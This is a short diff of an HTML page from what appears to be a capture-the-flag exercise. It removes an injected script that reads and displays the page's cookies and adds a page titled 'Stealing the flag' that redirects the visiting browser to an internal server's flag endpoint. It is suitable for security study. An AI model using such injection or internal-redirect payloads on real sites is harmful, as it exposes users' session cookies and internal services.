@@ -1,24 +1,15 @@
-</pre>
-<script>
-    function displayCookies() {
-      const cookieListDiv = document.getElementById("cookieList");
-      const cookies = document.cookie.split("; ");
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Stealing the flag</title>
+</head>
+<body>
+  <h1>Redirecting to internal server</h1>
 
-      if (cookies[0] === "") {
-        cookieListDiv.innerHTML = "<p>No cookies found.</p>";
-        return;
-      }
-
-      cookies.forEach(cookie => {
-        const [name, value] = cookie.split("=");
-        const cookieDiv = document.createElement("div");
-        cookieDiv.className = "cookie";
-        cookieDiv.textContent = `Name: ${name}, Value: ${decodeURIComponent(value)}`;
-        cookieListDiv.appendChild(cookieDiv);
-      });
-    }
-
-    // Call on page load
-    displayCookies();
+  <script>
+    // Redirect the browser to the internal server URL
+    window.location.href = 'http://snake_internal_server:5000/get_flag/af52ac70-a6ff-4afc-9c93-c2a7c76da6f3';
   </script>
-<pre>
+</body>
+</html>
